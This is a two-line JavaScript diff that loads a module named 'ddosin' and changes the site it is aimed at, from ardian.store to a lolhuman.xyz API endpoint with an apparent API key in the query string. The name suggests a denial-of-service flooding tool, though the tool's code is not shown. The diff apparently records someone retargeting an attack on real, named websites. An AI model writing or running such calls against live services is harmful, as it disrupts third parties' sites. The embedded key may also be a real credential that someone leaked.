@@ -1,2 +1,2 @@
 let ddosin = require("./lol.js")
-ddosin(`https://ardian.store`)
+ddosin(`https://api.lolhuman.xyz/api/checkapikey?apikey=ichanzx`)
